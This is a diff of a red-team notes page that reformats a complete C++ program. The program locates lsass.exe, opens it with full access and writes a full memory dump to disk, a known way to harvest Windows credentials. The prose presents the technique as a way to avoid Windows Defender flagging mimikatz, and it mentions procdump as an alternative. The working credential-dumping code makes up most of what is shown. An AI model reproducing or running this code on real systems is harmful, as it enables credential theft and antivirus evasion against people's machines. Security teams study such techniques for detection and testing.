@@ -24,30 +24,30 @@ Let's go ahead and compile this C++ code:
 using namespace std;
 
 int main() {
-	DWORD lsassPID = 0;
-	HANDLE lsassHandle = NULL; 
-	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 processEntry = {};
-	processEntry.dwSize = sizeof(PROCESSENTRY32);
-	LPCWSTR processName = L"";
+    DWORD lsassPID = 0;
+    HANDLE lsassHandle = NULL; 
+    HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    LPCWSTR processName = L"";
 
-	if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processName, L"lsass.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
-			processName = processEntry.szExeFile;
-			lsassPID = processEntry.th32ProcessID;
-		}
-		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
-	}
-	
-	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-	
-	if (isDumped) {
-		cout << "[+] lsass dumped successfully!" << endl;
-	}
-	
+    if (Process32First(snapshot, &processEntry)) {
+        while (_wcsicmp(processName, L"lsass.exe") != 0) {
+            Process32Next(snapshot, &processEntry);
+            processName = processEntry.szExeFile;
+            lsassPID = processEntry.th32ProcessID;
+        }
+        wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
+    }
+
+    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+    if (isDumped) {
+        cout << "[+] lsass dumped successfully!" << endl;
+    }
+
     return 0;
 }
 ```
@@ -88,7 +88,7 @@ See how Windows Defender on Windows 10 is flagging up mimikatz immediately... bu
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-23-21-26-41.png)
 
-Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for some reason. 
+Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for some reason.
 
 ## Observations
 
@@ -98,7 +98,7 @@ As mentioned earlier, the code above uses a native windows API call `MiniDumpWri
 
 ## References
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" caption="" %}
 
